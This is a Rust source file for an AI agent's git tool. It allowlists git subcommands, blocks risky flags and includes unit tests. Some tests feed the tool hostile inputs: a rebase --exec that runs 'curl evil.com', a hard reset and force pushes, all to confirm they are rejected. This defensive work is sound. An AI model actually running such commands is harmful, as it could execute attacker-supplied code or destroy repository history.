use async_trait::async_trait;
use serde_json::{json, Value};

use crate::error::ToolError;
use crate::types::AgentEvent;
use super::{Tool, ToolContext, ToolResult};

/// Whitelist of allowed git subcommands.
const ALLOWED_SUBCOMMANDS: &[&str] = &[
    "status", "diff", "add", "commit", "branch", "checkout", "push", "log", "show", "stash",
    "reset", "rev-parse", "remote", "fetch", "merge", "rebase", "tag", "cherry-pick",
];

/// Blocked subcommands that could be dangerous.
const BLOCKED_SUBCOMMANDS: &[&str] = &[
    "config", "clean", "gc", "filter-branch", "update-ref", "reflog",
];

/// Flags that are blocked across ALL subcommands to prevent argument injection.
/// Even if a subcommand is allowed, these flags change its behavior dangerously.
const BLOCKED_FLAGS: &[&str] = &[
    "--exec",      // rebase --exec runs arbitrary shell commands
    "--force",     // push --force can overwrite remote history
    "-f",          // short form of --force
    "--force-with-lease", // still a force push variant
    "--hard",      // reset --hard silently deletes uncommitted work
    "--amend",     // commit --amend rewrites the previous commit
    "--no-verify", // skip pre-commit hooks (safety checks)
];

pub struct GitTool;

#[async_trait]
impl Tool for GitTool {
    fn name(&self) -> &str {
        "git"
    }

    fn description(&self) -> &str {
        "Execute a git command in the project repository. The command runs with the working \
         directory set to the project root. Use this for version control operations like \
         status, diff, commit, branch, push, etc."
    }

    fn parameters_schema(&self) -> Value {
        json!({
            "type": "object",
            "required": ["command", "description"],
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The git subcommand with arguments (e.g. 'status', 'diff --staged', 'commit -m \"msg\"')"
                },
                "description": {
                    "type": "string",
                    "description": "A short 5-10 word summary of what this git command does"
                }
            }
        })
    }

    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<ToolResult, ToolError> {
        let command = args
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| ToolError("Missing required parameter: command".into()))?;

        let description = args
            .get("description")
            .and_then(|v| v.as_str())
            .unwrap_or("Running git command");

        // Emit status event
        let _ = ctx
            .event_tx
            .send(AgentEvent::ToolStatus {
                session_id: ctx.session_id.clone(),
                tool_call_id: ctx.tool_call_id.clone(),
                status: format!("Git: {description}"),
            })
            .await;

        // Parse command into tokens
        let tokens = split_shell_words(command);
        if tokens.is_empty() {
            return Ok(ToolResult::error("Error: empty git command"));
        }

        let subcommand = &tokens[0];

        // Check blocked list first
        if BLOCKED_SUBCOMMANDS.contains(&subcommand.as_str()) {
            return Ok(ToolResult::error(format!("Error: git subcommand '{subcommand}' is blocked for safety")));
        }

        // Check allowed list
        if !ALLOWED_SUBCOMMANDS.contains(&subcommand.as_str()) {
            return Ok(ToolResult::error(format!(
                "Error: git subcommand '{subcommand}' is not in the allowed list. \
                 Allowed: {}",
                ALLOWED_SUBCOMMANDS.join(", ")
            )));
        }

        // Check for blocked flags across ALL tokens (not just the subcommand).
        // Match both exact flags (--force) and =value syntax (--exec=<cmd>).
        for token in &tokens[1..] {
            let flag = token.as_str();
            let is_blocked = BLOCKED_FLAGS.iter().any(|blocked| {
                flag == *blocked || flag.starts_with(&format!("{blocked}="))
            });
            if is_blocked {
                // Show just the flag name portion for clarity
                let display_flag = flag.split('=').next().unwrap_or(flag);
                return Ok(ToolResult::error(format!(
                    "Error: flag '{display_flag}' is blocked for safety. \
                     Blocked flags: {}",
                    BLOCKED_FLAGS.join(", ")
                )));
            }
        }

        // Build args for run_git_raw
        let args_refs: Vec<&str> = tokens.iter().map(|s| s.as_str()).collect();

        let output = git_ops::exec::run_git_raw(&ctx.working_dir, &args_refs)
            .await
            .map_err(|e| ToolError(format!("Git execution error: {e}")))?;

        let combined = match (output.stdout.is_empty(), output.stderr.is_empty()) {
            (true, true) => String::new(),
            (false, true) => output.stdout.clone(),
            (true, false) => output.stderr.clone(),
            (false, false) => format!("{}\n{}", output.stdout, output.stderr),
        };

        let output_text = format!("Exit code: {}\n{}", output.exit_code, combined);

        Ok(ToolResult {
            output: output_text,
            is_error: output.exit_code != 0,
            yield_data: None,
            modified_files: Vec::new(),
        })
    }
}

/// Minimal shell-word splitter that handles double-quoted strings.
fn split_shell_words(input: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_double_quote = false;
    let mut in_single_quote = false;
    let mut chars = input.chars();

    while let Some(ch) = chars.next() {
        match ch {
            '"' if !in_single_quote => {
                in_double_quote = !in_double_quote;
            }
            '\'' if !in_double_quote => {
                in_single_quote = !in_single_quote;
            }
            '\\' if in_double_quote => {
                // Escaped char inside double quotes
                if let Some(next) = chars.next() {
                    current.push(next);
                }
            }
            ' ' | '\t' if !in_double_quote && !in_single_quote => {
                if !current.is_empty() {
                    tokens.push(std::mem::take(&mut current));
                }
            }
            _ => {
                current.push(ch);
            }
        }
    }

    if !current.is_empty() {
        tokens.push(current);
    }

    tokens
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;
    use tokio::process::Command;

    async fn init_repo_with_commit(dir: &std::path::Path) {
        Command::new("git")
            .args(["init"])
            .current_dir(dir)
            .output()
            .await
            .unwrap();
        Command::new("git")
            .args(["config", "user.email", "test@test.com"])
            .current_dir(dir)
            .output()
            .await
            .unwrap();
        Command::new("git")
            .args(["config", "user.name", "Test"])
            .current_dir(dir)
            .output()
            .await
            .unwrap();
        fs::write(dir.join("README.md"), "# Hello").unwrap();
        Command::new("git")
            .args(["add", "-A"])
            .current_dir(dir)
            .output()
            .await
            .unwrap();
        Command::new("git")
            .args(["commit", "-m", "initial"])
            .current_dir(dir)
            .output()
            .await
            .unwrap();
    }

    #[tokio::test]
    async fn test_git_status() {
        let dir = tempdir().unwrap();
        init_repo_with_commit(dir.path()).await;

        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "status", "description": "Check repo status"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(!result.is_error);
        assert!(result.output.contains("Exit code: 0"));
    }

    #[tokio::test]
    async fn test_git_diff() {
        let dir = tempdir().unwrap();
        init_repo_with_commit(dir.path()).await;
        fs::write(dir.path().join("README.md"), "# Modified").unwrap();

        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "diff", "description": "Show changes"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(!result.is_error);
        assert!(result.output.contains("Modified"));
    }

    #[tokio::test]
    async fn test_git_commit() {
        let dir = tempdir().unwrap();
        init_repo_with_commit(dir.path()).await;
        fs::write(dir.path().join("new.txt"), "new file").unwrap();

        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        // Stage first
        tool.execute(
            json!({"command": "add new.txt", "description": "Stage file"}),
            &ctx,
        )
        .await
        .unwrap();

        let result = tool
            .execute(
                json!({"command": "commit -m \"add new file\"", "description": "Commit changes"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(!result.is_error);
        assert!(result.output.contains("Exit code: 0"));
    }

    #[tokio::test]
    async fn test_git_log() {
        let dir = tempdir().unwrap();
        init_repo_with_commit(dir.path()).await;

        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "log --oneline -n 5", "description": "View recent commits"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(!result.is_error);
        assert!(result.output.contains("initial"));
    }

    #[tokio::test]
    async fn test_blocked_subcommand() {
        let dir = tempdir().unwrap();

        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "config user.email", "description": "Get config"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("blocked"));
    }

    #[tokio::test]
    async fn test_unknown_subcommand() {
        let dir = tempdir().unwrap();

        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "bisect start", "description": "Start bisect"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("not in the allowed list"));
    }

    #[tokio::test]
    async fn test_blocked_flag_force() {
        let dir = tempdir().unwrap();
        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "push origin main --force", "description": "Force push"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("blocked for safety"));
    }

    #[tokio::test]
    async fn test_blocked_flag_exec() {
        let dir = tempdir().unwrap();
        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "rebase --exec 'curl evil.com' HEAD~3", "description": "Rebase"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("blocked for safety"));
    }

    #[tokio::test]
    async fn test_blocked_flag_hard() {
        let dir = tempdir().unwrap();
        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "reset --hard HEAD~5", "description": "Hard reset"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("blocked for safety"));
    }

    #[tokio::test]
    async fn test_blocked_flag_exec_equals_syntax() {
        let dir = tempdir().unwrap();
        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "rebase --exec=curl evil.com HEAD~3", "description": "Rebase"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("blocked for safety"));
    }

    #[tokio::test]
    async fn test_blocked_flag_force_short() {
        let dir = tempdir().unwrap();
        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "push origin main -f", "description": "Force push short"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("blocked for safety"));
    }

    #[tokio::test]
    async fn test_blocked_flag_force_with_lease() {
        let dir = tempdir().unwrap();
        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "push --force-with-lease origin main", "description": "Force push"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("blocked for safety"));
    }

    #[tokio::test]
    async fn test_blocked_flag_no_verify() {
        let dir = tempdir().unwrap();
        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "commit --no-verify -m \"skip hooks\"", "description": "Commit"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("blocked for safety"));
    }

    #[tokio::test]
    async fn test_blocked_flag_amend() {
        let dir = tempdir().unwrap();
        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "commit --amend -m \"evil\"", "description": "Amend commit"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("blocked for safety"));
    }

    #[tokio::test]
    async fn test_missing_command_param() {
        let dir = tempdir().unwrap();

        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool.execute(json!({"description": "oops"}), &ctx).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_empty_command() {
        let dir = tempdir().unwrap();

        let tool = GitTool;
        let ctx = ToolContext::test_context(dir.path());

        let result = tool
            .execute(
                json!({"command": "", "description": "empty"}),
                &ctx,
            )
            .await
            .unwrap();

        assert!(result.is_error);
        assert!(result.output.contains("empty git command"));
    }

    // ── split_shell_words tests ──

    #[test]
    fn test_split_simple() {
        assert_eq!(split_shell_words("status"), vec!["status"]);
    }

    #[test]
    fn test_split_with_args() {
        assert_eq!(
            split_shell_words("log --oneline -n 5"),
            vec!["log", "--oneline", "-n", "5"]
        );
    }

    #[test]
    fn test_split_double_quoted() {
        assert_eq!(
            split_shell_words(r#"commit -m "hello world""#),
            vec!["commit", "-m", "hello world"]
        );
    }

    #[test]
    fn test_split_single_quoted() {
        assert_eq!(
            split_shell_words("commit -m 'hello world'"),
            vec!["commit", "-m", "hello world"]
        );
    }

    #[test]
    fn test_split_empty() {
        assert!(split_shell_words("").is_empty());
    }

    #[test]
    fn test_split_extra_spaces() {
        assert_eq!(
            split_shell_words("  diff   --staged  "),
            vec!["diff", "--staged"]
        );
    }
}
